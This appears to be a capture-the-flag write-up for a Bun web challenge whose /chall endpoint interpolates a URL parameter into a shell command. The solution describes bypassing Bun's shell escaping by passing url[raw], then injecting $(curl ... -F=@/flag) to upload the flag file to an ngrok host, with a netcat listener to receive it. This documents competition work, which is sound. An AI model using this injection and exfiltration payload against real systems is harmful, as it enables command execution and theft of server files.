## Boom-boom-hell

This challenge uses Bun as the framework to develop the web app.
It uses the docker image: `oven/bun:1.0.35-slim` as the os running the webapp.
The flag is in `/flag`
the port uses is 3000.
The web app has one endpoint `/chall`. It receives a parameter `url` and execute the following steps:
- Verify if has special characters: `params.url.length < escapeHTML(params.url).length`
- Then it checks if the url inserted has the base url: `https://www.lycorp.co.jp`
- It then runs a command using the url: `$curl -sL ${lyURL}.text();`
- It counts all the LINE and Yahoo! words and executes another command: `echo $(date '+%Y-%m-%dT%H:%M:%S%z') - ${params.url} ::: ${JSON.stringify(counts)} >> ${logFile}`

## Solution

In the line: `const params = qs.parse(url.search, {ignoreQueryPrefix: true});` if we use `url[raw]=$()` it translates to `{"raw":"$()"}` and it won't be escaped and get executed when passed to : 
```js
await $`echo $(date '+%Y-%m-%dT%H:%M:%S%z') - ${params.url} ::: ${JSON.stringify(counts)} >> ${logFile}`;
```

In documentation,[https://bun.sh/docs/runtime/shell#escape-escape-strings](), *If you do not want your string to be escaped, wrap it in a { raw: 'str' } object:*.

So the solutions was: ``http://34.146.180.210:3000/chall?url[raw]=$(curl%20myserver%20-F=@/flag)`

Run ngrok: `ngrok http --domain=mutually-cheerful-meerkat.ngrok-free.app 8000` and replace myserver with the ngrok domain.
Run netcat: `nc -lvnp 8000`